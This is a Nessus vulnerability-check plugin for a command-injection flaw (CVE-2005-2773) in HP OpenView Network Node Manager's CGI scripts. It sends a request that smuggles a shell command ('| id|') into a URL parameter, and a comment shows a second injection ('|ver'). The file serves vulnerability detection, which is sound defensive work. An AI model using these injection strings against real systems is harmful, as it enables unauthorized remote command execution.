#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(19555);
  script_version("$Revision: 1.18 $");

  script_cve_id("CVE-2005-2773");
  script_bugtraq_id(14662, 14737);
  script_osvdb_id(19057, 19058, 19059, 19060, 21483);

  script_name(english:"HP OpenView Network Node Manager Multiple Scripts Remote Command Execution");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that allows execution of
arbitrary commands." );
 script_set_attribute(attribute:"description", value:
"The remote version of HP OpenView Network Node Manager fails to
sanitize user-supplied input to various parameters used in the
'cdpView.ovpl', 'connectedNotes.ovpl', 'ecscmg.ovpl', and
'freeIPaddrs.ovpl' scripts before using it to run a command.  By
leveraging these flaws, an unauthenticated attacker may be able to
execute arbitrary commands on the remote host within the context of
the affected web server userid." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/409179" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/409196" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/advisories/9150" );
 script_set_attribute(attribute:"see_also", value:"http://www4.itrc.hp.com/service/cki/docDisplay.do?docId=c00604164" );
 script_set_attribute(attribute:"solution", value:
"Apply the appropriate patch referenced in the vendor's advisory 
above." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"metasploit_name", value:'HP Openview connectedNodes.ovpl Remote Command Execution');
 script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/09/01");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/08/25");
 script_cvs_date("$Date: 2012/12/13 23:15:37 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:hp:openview_network_node_manager");
script_end_attributes();

 
  summary["english"] = "Checks for multiple remote command execution vulnerabilities in HP OpenView Network Node Manager";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2012 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80, 3443);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:3443, embedded: 0);

# /OvCgi/connectedNodes.ovpl?node=127.0.0.1|ver displays the version of the remote Windows system
# with a vulnerable version of HP OpenView NNM
w = http_send_recv3(method:"GET", 
  item:string("/OvCgi/freeIPaddrs.ovpl?netnum=127.0.0.1&netmask=255.255.255.0&netid=127.0.0.1%20|%20id|"),
  port:port
);
if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
res = w[2];

if ( "<FONT SIZE=+1><B>FATAL ERROR: Could not close ovtopodump -r 127.0.0.1 | id|. Have your administrator run 'ovstart'</B></FONT>" >< res )
  security_hole(port);
